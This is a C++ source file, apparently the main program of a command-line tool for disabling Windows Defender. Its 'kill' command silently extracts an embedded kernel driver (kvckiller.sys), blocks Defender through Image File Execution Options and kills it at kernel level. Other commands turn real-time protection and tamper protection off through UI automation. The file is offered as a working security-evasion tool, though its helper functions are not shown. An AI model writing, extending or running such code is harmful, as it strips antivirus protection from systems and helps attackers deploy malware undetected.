#include "WinDefCtl.h"
#include "BannerUtils.h"
#include "DefenderManager.h"
#include "KillerEngine.h"
#include "DriverExtract.h"
#include <iostream>

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 2) {
        BannerUtils::ShowUsage();
        return 0;
    }

    std::wstring command = argv[1];

    // ── kill ─────────────────────────────────────────────────────────────────
    // IFEO block + kvckiller.sys kernel-kill. No UI overlay (silent).
    if (command == L"kill") {
        BannerUtils::ShowBanner();
        std::wcout << L"\n=== Windows Defender Kill ===\n\n";

        std::wcout << L"[*] Extracting kvckiller.sys...\n";
        if (!ExtractKillerDriver()) {
            std::wcout << L"[!] Driver extraction failed\n";
            return 1;
        }

        if (!DefenderManager::DisableSecurityEngine())
            return 1;

        if (!KillerEngine::KillDefender(GetKillerDriverPath()))
            std::wcout << L"[-] Kernel kill incomplete\n";

        std::wcout << L"\n[*] Done. Defender is blocked.\n";
        return 0;
    }

    // ── restore ───────────────────────────────────────────────────────────────
    // Remove IFEO block + start WinDefend. No UI overlay (silent).
    if (command == L"restore") {
        BannerUtils::ShowBanner();
        std::wcout << L"\n=== Windows Defender Restore ===\n\n";

        if (!DefenderManager::EnableSecurityEngine())
            return 1;

        std::wcout << L"\n[*] Done. Defender is restored.\n";
        return 0;
    }

    // ── rtp ───────────────────────────────────────────────────────────────────
    if (command == L"rtp") {
        BannerUtils::ShowBanner();
        std::wcout << L"\n=== Windows Defender RTP Control ===\n";

        WindowsDefenderAutomation wda;

        if (!wda.openDefenderSettings()) {
            std::wcout << L"  [ERROR] Fatal: Cannot open Windows Security.\n";
            return 1;
        }

        if (argc < 3) {
            wda.getRealTimeProtectionStatus();
            wda.closeSecurityWindow();
            return 0;
        }

        std::wstring action = argv[2];
        bool result = false;

        if (action == L"on")           result = wda.enableRealTimeProtection();
        else if (action == L"off")     result = wda.disableRealTimeProtection();
        else if (action == L"status")  wda.getRealTimeProtectionStatus();
        else {
            std::wcout << L"  [ERROR] Unknown action: " << action << L"\n";
            BannerUtils::ShowUsage();
        }

        wda.closeSecurityWindow();
        return result ? 0 : 1;
    }

    // ── tp ────────────────────────────────────────────────────────────────────
    if (command == L"tp") {
        BannerUtils::ShowBanner();
        std::wcout << L"\n=== Windows Defender Tamper Protection Control ===\n";

        WindowsDefenderAutomation wda;

        if (!wda.openDefenderSettings()) {
            std::wcout << L"  [ERROR] Fatal: Cannot open Windows Security.\n";
            return 1;
        }

        if (argc < 3) {
            wda.getTamperProtectionStatus();
            wda.closeSecurityWindow();
            return 0;
        }

        std::wstring action = argv[2];
        bool result = false;

        if (action == L"on")           result = wda.enableTamperProtection();
        else if (action == L"off")     result = wda.disableTamperProtection();
        else if (action == L"status")  wda.getTamperProtectionStatus();
        else {
            std::wcout << L"  [ERROR] Unknown action: " << action << L"\n";
            BannerUtils::ShowUsage();
        }

        wda.closeSecurityWindow();
        return result ? 0 : 1;
    }

    BannerUtils::ShowUsage();
    return 0;
}
